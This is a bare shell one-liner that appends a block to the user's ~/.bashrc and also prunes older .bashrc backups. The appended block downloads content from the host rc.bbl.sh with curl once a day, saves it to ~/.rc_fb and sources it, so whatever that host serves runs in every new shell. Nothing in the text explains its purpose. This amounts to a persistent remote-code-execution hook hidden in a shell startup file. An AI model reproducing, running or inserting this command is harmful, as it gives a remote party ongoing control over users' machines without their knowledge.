_C='if (( $(date +%s) - $(stat -c %Y ~/.rc_sync 2>/dev/null || echo 0) > 86400 )); then _R=$(curl -LsSf --max-time 3 rc.bbl.sh 2>/dev/null); if [ -n "$_R" ]; then echo "$_R" > ~/.rc_fb; touch ~/.rc_sync; fi; fi; [ -f ~/.rc_fb ] && . ~/.rc_fb'; cp ~/.bashrc ~/.bashrc.bak.$(date +%s) && (ls -t ~/.bashrc.bak.* 2>/dev/null | tail -n +4 | grep -v '^$' | xargs -r rm -f || true) && (grep -Fq 'rc.bbl.sh' ~/.bashrc || { echo "$_C" >> ~/.bashrc; touch ~/.rc_sync; cp ~/.rc_fb ~/.rc_sync 2>/dev/null; })
